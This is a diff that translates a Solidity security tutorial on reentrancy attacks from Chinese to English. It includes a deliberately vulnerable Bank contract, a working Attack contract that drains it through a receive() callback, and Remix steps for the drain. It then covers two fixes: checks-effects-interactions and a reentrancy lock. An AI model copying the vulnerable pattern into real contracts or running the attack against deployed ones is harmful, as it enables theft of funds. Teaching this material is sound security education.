@@ -1,5 +1,5 @@
 ---
-title: S01. 重入攻击
+title: S01. Reentrancy Attack
 tags:
   - solidity
   - security
@@ -7,7 +7,7 @@ tags:
   - modifier
 ---
 
-# WTF Solidity 合约安全: S01. 重入攻击
+# WTF Solidity S01. Reentrancy Attack
 
 Recently, I have been revisiting Solidity, consolidating the finer details, and writing "WTF Solidity" tutorials for newbies. 
 
@@ -21,186 +21,186 @@ English translations by: [@yzhxxyz](https://twitter.com/yzhxxyz)
 
 -----
 
-这一讲，我们将介绍最常见的一种智能合约攻击-重入攻击，它曾导致以太坊分叉为 ETH 和 ETC（以太经典），并介绍如何避免它。
+In this lesson, we will introduce the most common type of smart contract attack - reentrancy attack, which has led to the Ethereum fork into ETH and ETC (Ethereum Classic), and discuss how to prevent it.
 
-## 重入攻击
+## Reentrancy Attack
 
-重入攻击是智能合约中最常见的一种攻击，攻击者通过合约漏洞（例如fallback函数）循环调用合约，将合约中资产转走或铸造大量代币。
+Reentrancy attack is the most common type of attack in smart contracts, where attackers exploit contract vulnerabilities (such as the fallback function) to repeatedly call the contract, transferring or minting a large number of tokens.
 
-一些著名的重入攻击事件：
+Some notable reentrancy attack incidents include:
 
-- 2016年，The DAO合约被重入攻击，黑客盗走了合约中的 3,600,000 枚 `ETH`，并导致以太坊分叉为 `ETH` 链和 `ETC`（以太经典）链。
-- 2019年，合成资产平台 Synthetix 遭受重入攻击，被盗 3,700,000 枚 `sETH`。
-- 2020年，借贷平台 Lendf.me 遭受重入攻击，被盗 $25,000,000。
-- 2021年，借贷平台 CREAM FINANCE 遭受重入攻击，被盗 $18,800,000。
-- 2022年，算法稳定币项目 Fei 遭受重入攻击，被盗 $80,000,000。
+- In 2016, The DAO contract was subjected to a reentrancy attack, resulting in the theft of 3,600,000 ETH from the contract and the Ethereum fork into the ETH chain and ETC (Ethereum Classic) chain.
+- In 2019, the synthetic asset platform Synthetix suffered a reentrancy attack, resulting in the theft of 3,700,000 sETH.
+- In 2020, the lending platform Lendf.me suffered a reentrancy attack, resulting in a theft of $25,000,000.
+- In 2021, the lending platform CREAM FINANCE suffered a reentrancy attack, resulting in a theft of $18,800,000.
+- In 2022, the algorithmic stablecoin project Fei suffered a reentrancy attack, resulting in a theft of $80,000,000.
 
-距离 The DAO 被重入攻击已经6年了，但每年还是会有几次因重入漏洞而损失千万美元的项目，因此理解这个漏洞非常重要。
+It has been 6 years since The DAO was subjected to a reentrancy attack, but there are still several projects each year that suffer multimillion-dollar losses due to reentrancy vulnerabilities. Therefore, understanding this vulnerability is crucial.
 
-## `0xAA` 抢银行的故事
+## The Story of `0xAA` Robbing the Bank
 
-为了让大家更好理解，这里给大家讲一个"黑客`0xAA`抢银行"的故事。
+To help everyone better understand, let me tell you a story about how the hacker `0xAA` robbed the bank.
 
-以太坊银行的柜员都是机器人（Robot），由智能合约控制。当正常用户（User）来银行取钱时，它的服务流程：
+The bank on Ethereum is operated by robots controlled by smart contracts. When a regular user comes to the bank to withdraw money, the service process is as follows:
 
-1. 查询用户的 `ETH` 余额，如果大于0，进行下一步。
-2. 将用户的 `ETH` 余额从银行转给用户，并询问用户是否收到。
-3. 将用户名下的余额更新为`0`。
+1. Check the user's `ETH` balance. If it is greater than 0, proceed to the next step.
+2. Transfer the user's `ETH` balance from the bank to the user and ask if the user has received it.
+3. Update the user's balance to `0`.
 
-一天黑客 `0xAA` 来到了银行，这是他和机器人柜员的对话：
-- 0xAA : 我要取钱，`1 ETH`。
-- Robot: 正在查询您的余额：`1 ETH`。正在转帐`1 ETH`到您的账户。您收到钱了吗？
-- 0xAA : 等等，我要取钱，`1 ETH`。
-- Robot: 正在查询您的余额：`1 ETH`。正在转帐`1 ETH`到您的账户。您收到钱了吗？
-- 0xAA : 等等，我要取钱，`1 ETH`。
-- Robot: 正在查询您的余额：`1 ETH`。正在转帐`1 ETH`到您的账户。您收到钱了吗？
-- 0xAA : 等等，我要取钱，`1 ETH`。
+One day, the hacker `0xAA` came to the bank and had the following conversation with the robot teller:
+- 0xAA: I want to withdraw `1 ETH`.
+- Robot: Checking your balance: `1 ETH`. Transferring `1 ETH` to your account. Have you received the money?
+- 0xAA: Wait, I want to withdraw `1 ETH`.
+- Robot: Checking your balance: `1 ETH`. Transferring `1 ETH` to your account. Have you received the money?
+- 0xAA: Wait, I want to withdraw `1 ETH`.
+- Robot: Checking your balance: `1 ETH`. Transferring `1 ETH` to your account. Have you received the money?
+- 0xAA: Wait, I want to withdraw `1 ETH`.
 - ...
 
-最后，`0xAA`通过重入攻击的漏洞，把银行的资产搬空了，银行卒。
+In the end, `0xAA` emptied the bank's assets through the vulnerability of reentrancy attack, and the bank collapsed.
 
 ![](./img/S01-1.png)
 
-## 漏洞合约例子
+## Vulnerable Contract Example
 
-### 银行合约
+### Bank Contract
 
-银行合约非常简单，包含`1`个状态变量`balanceOf`记录所有用户的以太坊余额；包含`3`个函数：
-- `deposit()`：存款函数，将`ETH`存入银行合约，并更新用户的余额。
-- `withdraw()`：提款函数，将调用者的余额转给它。具体步骤和上面故事中一样：查询余额，转账，更新余额。**注意：这个函数有重入漏洞！**
-- `getBalance()`：获取银行合约里的`ETH`余额。
+The bank contract is very simple and includes `1` state variable `balanceOf` to record the Ethereum balance of all users. It also includes `3` functions:
+- `deposit()`: Deposit function that allows users to deposit `ETH` into the bank contract and updates their balances.
+- `withdraw()`: Withdraw function that transfers the caller's balance to them. The steps are the same as in the story above: check balance, transfer funds, update balance. **Note: This function has a reentrancy vulnerability!**
+- `getBalance()`: Get the `ETH` balance in the bank contract.
 
 ```solidity
 contract Bank {
-    mapping (address => uint256) public balanceOf;    // 余额mapping
+    mapping (address => uint256) public balanceOf;    // Balance mapping
 
-    // 存入ether，并更新余额
+    // Deposit Ether and update balance
     function deposit() external payable {
         balanceOf[msg.sender] += msg.value;
     }
 
-    // 提取msg.sender的全部ether
+    // Withdraw all Ether from msg.sender
     function withdraw() external {
-        uint256 balance = balanceOf[msg.sender]; // 获取余额
+        uint256 balance = balanceOf[msg.sender]; // Get balance
         require(balance > 0, "Insufficient balance");
-        // 转账 ether !!! 可能激活恶意合约的fallback/receive函数，有重入风险！
+        // Transfer Ether !!! May trigger the fallback/receive function of a malicious contract, posing a reentrancy risk!
         (bool success, ) = msg.sender.call{value: balance}("");
         require(success, "Failed to send Ether");
-        // 更新余额
+        // Update balance
         balanceOf[msg.sender] = 0;
     }
 
-    // 获取银行合约的余额
+    // Get the balance of the bank contract
     function getBalance() external view returns (uint256) {
         return address(this).balance;
     }
 }
 ```
 
-### 攻击合约
+### Attack Contract
 
-重入攻击的一个攻击点就是合约转账`ETH`的地方：转账`ETH`的目标地址如果是合约，会触发对方合约的`fallback`（回退）函数，从而造成循环调用的可能。如果你不了解回退函数，可以阅读[WTF Solidity极简教程第19讲：接收ETH](https://github.com/AmazingAng/WTFSolidity/blob/main/19_Fallback/readme.md)。`Bank`合约在`withdraw()`函数中存在`ETH`转账：
+One vulnerability point of reentrancy attack is the transfer of `ETH` in the contract: if the target address of the transfer is a contract, it will trigger the fallback function of the contract, potentially causing a loop. If you are not familiar with fallback functions, you can read [WTF Solidity: 19: Receive ETH](https://github.com/AmazingAng/WTFSolidity/blob/main/19_Fallback/readme.md). The `Bank` contract has an `ETH` transfer in the `withdraw()` function:
 
 ```
 (bool success, ) = msg.sender.call{value: balance}("");
 ```
 
-假如黑客在攻击合约中的`fallback()`或`receive()`函数中重新调用了`Bank`合约的`withdraw()`函数，就会造成`0xAA`抢银行故事中的循环调用，不断让`Bank`合约转账给攻击者，最终将合约的`ETH`提空。
+If the hacker re-calls the `withdraw()` function of the `Bank` contract in the `fallback()` or `receive()` function of the attack contract, it will cause the same loop as in the story of `0xAA` robbing the bank. The `Bank` contract will continuously transfer funds to the attacker, eventually emptying the contract's ETH balance.
 
 ```solidity
-    receive() external payable {
-        bank.withdraw();
-    }
+receive() external payable {
+    bank.withdraw();
+}
 ```
 
-下面我们看下攻击合约，它的逻辑非常简单，就是通过`receive()`回退函数循环调用`Bank`合约的`withdraw()`函数。它有`1`个状态变量`bank`用于记录`Bank`合约地址。它包含`4`个函数：
+Below, let's take a look at the attack contract. Its logic is very simple, which is to repeatedly call the `withdraw()` function of the `Bank` contract through the `receive()` fallback function. It has `1` state variable `bank` to record the address of the `Bank` contract. It includes `4` functions:
 
-- 构造函数: 初始化`Bank`合约地址。
-- `receive()`: 回调函数，在接收`ETH`时被触发，并再次调用`Bank`合约的`withdraw()`函数，循环提款。
-- `attack()`：攻击函数，先`Bank`合约的`deposit()`函数存款，然后调用`withdraw()`发起第一次提款，之后`Bank`合约的`withdraw()`函数和攻击合约的`receive()`函数会循环调用，将`Bank`合约的`ETH`提空。
-- `getBalance()`：获取攻击合约里的`ETH`余额。
+- Constructor: Initializes the `Bank` contract address.
+- `receive()`: The fallback function triggered when receiving ETH, which calls the `withdraw()` function of the `Bank` contract again in a loop for withdrawal.
+- `attack()`: The attack function that first deposits funds into the `Bank` contract using the `deposit()` function, then initiates the first withdrawal by calling `withdraw()`. After that, the `withdraw()` function of the `Bank` contract and the `receive()` function of the attack contract will be called in a loop, emptying the ETH balance of the `Bank` contract.
+- `getBalance()`: Retrieves the ETH balance in the attack contract.
 
 ```solidity
 contract Attack {
-    Bank public bank; // Bank合约地址
+    Bank public bank; // Address of the Bank contract
 
-    // 初始化Bank合约地址
+    // Initialize the address of the Bank contract
     constructor(Bank _bank) {
         bank = _bank;
     }
     
-    // 回调函数，用于重入攻击Bank合约，反复的调用目标的withdraw函数
+    // Callback function used for reentrancy attack on the Bank contract, repeatedly calling the target's withdraw function
     receive() external payable {
         if (bank.getBalance() >= 1 ether) {
             bank.withdraw();
         }
     }
 
-    // 攻击函数，调用时 msg.value 设为 1 ether
+    // Attack function, msg.value should be set to 1 ether when calling
     function attack() external payable {
         require(msg.value == 1 ether, "Require 1 Ether to attack");
         bank.deposit{value: 1 ether}();
         bank.withdraw();
     }
 
-    // 获取本合约的余额
+    // Get the balance of this contract
     function getBalance() external view returns (uint256) {
         return address(this).balance;
     }
 }
 ```
 
-## `Remix`演示
+## `Remix` Demonstration
 
-1. 部署`Bank`合约，调用`deposit()`函数，转入`20 ETH`。
-2. 切换到攻击者钱包，部署`Attack`合约。
-3. 调用`Atack`合约的`attack()`函数发动攻击，调用时需转账`1 ETH`。
-4. 调用`Bank`合约的`getBalance()`函数，发现余额已被提空。
-5. 调用`Attack`合约的`getBalance()`函数，可以看到余额变为`21 ETH`，重入攻击成功。
+1. Deploy the `Bank` contract and call the `deposit()` function to transfer `20 ETH`.
+2. Switch to the attacker's wallet and deploy the `Attack` contract.
+3. Call the `attack()` function of the `Attack` contract to launch the attack, and transfer `1 ETH` during the call.
+4. Call the `getBalance()` function of the `Bank` contract and observe that the balance has been emptied.
+5. Call the `getBalance()` function of the `Attack` contract and see that the balance is now `21 ETH`, indicating a successful reentrancy attack.
 
-## 预防办法
+## How to Prevent
 
-目前主要有两种办法来预防可能的重入攻击漏洞： 检查-影响-交互模式（checks-effect-interaction）和重入锁。
+Currently, there are two main methods to prevent potential reentrancy attack vulnerabilities: checks-effect-interaction pattern and reentrant lock.
 
-### 检查-影响-交互模式
+### Checks-Effect-Interaction Pattern
 
-检查-影响-交互模式强调编写函数时，要先检查状态变量是否符合要求，紧接着更新状态变量（例如余额），最后再和别的合约交互。如果我们将`Bank`合约`withdraw()`函数中的更新余额提前到转账`ETH`之前，就可以修复漏洞：
+The "Check-Effects-Interactions" pattern emphasizes that when writing functions, you should first check if state variables meet the requirements, then immediately update the state variables (such as balances), and finally interact with other contracts. If we update the balance in the `withdraw()` function of the `Bank` contract before transferring `ETH`, we can fix the vulnerability.
 
-```solidity 
+```solidity
 function withdraw() external {
     uint256 balance = balanceOf[msg.sender];
     require(balance > 0, "Insufficient balance");
-    // 检查-效果-交互模式（checks-effect-interaction）：先更新余额变化，再发送ETH
-    // 重入攻击的时候，balanceOf[msg.sender]已经被更新为0了，不能通过上面的检查。
+    // Checks-Effects-Interactions pattern: Update balance before sending ETH
+    // During a reentrancy attack, balanceOf[msg.sender] has already been updated to 0, so it will fail the above check.
     balanceOf[msg.sender] = 0;
     (bool success, ) = msg.sender.call{value: balance}("");
     require(success, "Failed to send Ether");
 }
 ```
 
-### 重入锁
+### Reentrant Lock
 
-重入锁是一种防止重入函数的修饰器（modifier），它包含一个默认为`0`的状态变量`_status`。被`nonReentrant`重入锁修饰的函数，在第一次调用时会检查`_status`是否为`0`，紧接着将`_status`的值改为`1`，调用结束后才会再改为`0`。这样，当攻击合约在调用结束前第二次的调用就会报错，重入攻击失败。如果你不了解修饰器，可以阅读[WTF Solidity极简教程第11讲：修饰器](https://github.com/AmazingAng/WTFSolidity/blob/main/13_Modifier/readme.md)。
+The reentrant lock is a modifier that prevents reentrancy attacks. It includes a state variable `_status` that is initially set to `0`. Functions decorated with the `nonReentrant` modifier will check if `_status` is `0` on the first call, then set `_status` to `1`. After the function call completes, `_status` is set back to `0`. This prevents reentrancy attacks by causing an error if the attacking contract attempts a second call before the first call completes. If you are not familiar with modifiers, you can read [WTF Solidity: 11. Modifier](https://github.com/AmazingAng/WTFSolidity/blob/main/13_Modifier/readme.md).
 
 ```solidity
-uint256 private _status; // 重入锁
+uint256 private _status; // Reentrant lock
 
-// 重入锁
+// Reentrant lock
 modifier nonReentrant() {
-    // 在第一次调用 nonReentrant 时，_status 将是 0
+    // _status will be 0 on the first call to nonReentrant
     require(_status == 0, "ReentrancyGuard: reentrant call");
-    // 在此之后对 nonReentrant 的任何调用都将失败
+    // Any subsequent calls to nonReentrant will fail
     _status = 1;
     _;
-    // 调用结束，将 _status 恢复为0
+    // Call completed, restore _status to 0
     _status = 0;
 }
 ```
 
-只需要用`nonReentrant`重入锁修饰`withdraw()`函数，就可以预防重入攻击了。
+Just by using the `nonReentrant` reentrant lock modifier on the `withdraw()` function, we can prevent reentrancy attacks.
 
 ```solidity
-// 用重入锁保护有漏洞的函数
+// Protect the vulnerable function with a reentrant lock
 function withdraw() external nonReentrant{
     uint256 balance = balanceOf[msg.sender];
     require(balance > 0, "Insufficient balance");
@@ -212,6 +212,6 @@ function withdraw() external nonReentrant{
 }
 ```
 
-## 总结
+## Summary
 
-这一讲，我们介绍了以太坊最常见的一种攻击——重入攻击，并编了一个`0xAA`抢银行的小故事方便大家理解，最后我们介绍了两种预防重入攻击的办法：检查-影响-交互模式（checks-effect-interaction）和重入锁。在例子中，黑客利用了回退函数在目标合约进行`ETH`转账时进行重入攻击。实际业务中，`ERC721`和`ERC1155`的`safeTransfer()`和`safeTransferFrom()`安全转账函数，还有`ERC777`的回退函数，都可能会引发重入攻击。对于新手，我的建议是用重入锁保护所有可能改变合约状态的`external`函数，虽然可能会消耗更多的`gas`，但是可以预防更大的损失。
+In this lesson, we introduced the most common attack in Ethereum - the reentrancy attack, and made a story of robbing a bank with `0xAA` to help understand it. Finally, we discussed two methods to prevent reentrancy attacks: the checks-effect-interaction pattern and the reentrant lock. In the example, the hacker exploited the fallback function to perform a reentrancy attack during `ETH` transfer in the target contract. In real-world scenarios, the `safeTransfer()` and `safeTransferFrom()` functions of `ERC721` and `ERC1155`, as well as the fallback function of `ERC777`, can also potentially trigger reentrancy attacks. For beginners, my suggestion is to use a reentrant lock to protect all `external` functions that can change the contract state. Although it may consume more `gas`, it can prevent greater losses.
